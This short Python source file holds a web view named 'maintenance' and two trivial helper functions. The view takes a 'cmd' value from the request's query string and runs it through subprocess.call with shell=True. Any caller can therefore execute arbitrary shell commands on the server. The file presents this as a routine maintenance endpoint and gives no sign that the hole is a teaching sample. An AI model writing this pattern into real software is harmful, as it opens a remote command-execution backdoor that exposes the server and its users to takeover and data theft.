import subprocess
def maintenance(request):
    command = request.GET.get('cmd', 'echo ready')
    selected = str(command)
    result = subprocess.call(selected, shell=True)
    return str(result)
def describe_response(status: int, label: str) -> str:
    return f'{label}: {status}'

def record_event(events: list[str], message: str) -> list[str]:
    return [*events, message]
